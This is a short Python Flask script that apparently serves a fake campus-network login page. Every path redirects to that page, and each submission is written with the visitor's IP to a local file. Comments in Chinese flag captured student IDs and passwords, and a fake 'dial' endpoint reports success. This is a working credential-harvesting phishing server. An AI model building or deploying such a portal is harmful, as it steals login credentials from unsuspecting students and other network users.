from flask import *
import os
app = Flask(__name__, static_url_path='')



#放行ip
def accept_ip(ip):
	pass


@app.route('/')
def index():
	return render_template("216.html")

@app.route('/login',methods = ["POST"])
def indexP():
	if(request.method == "POST"):
		formDatas = request.form
		ip = request.remote_addr
		head = request.headers
		#保存post数据先
		print(formDatas)
		f = open("posts.txt","a")
		f.write(str(ip)+'\n')
		f.write(str(formDatas)+'\n')
		print(ip)
		
		try:
			#print(formDatas['user'])
			if(len(formDatas['user']) == 10 and formDatas['user'][:2]=='20'):
				f.write('检测到学号\n')
				if(accept_ip(ip)):
					print('放行成功\n')
					f.write('放行\n')
			
			if(len(formDatas['pass']) == 6):
				f.write('检测到密码\n')
			f.close()
			return render_template("216success.html")
			
		
		except KeyError:
		
			f.write('#keyerror\n')
		
		f.close()


	return render_template("216.html")


@app.route('/dial')
def dial():
	return Response('{"code": 0}',content_type='application/json')


# @app.route('/211suc')
# def index2():
# 	return render_template("211suc.html")

#@app.route('/216suc')
#def index3():
#	return render_template("216success.html")



@app.route('/<sth>',methods=['GET','POST','PUT'])
def index4(sth):
	return redirect(url_for("index"),302)

@app.errorhandler(404)
def page_not_found(e):
	return "Error code: 404 URL no found", 404

@app.errorhandler(500)
def page_not_found(e):
	return "Error code: 500", 500

if __name__ == '__main__':
	app.run(host='0.0.0.0',port = 80)
	

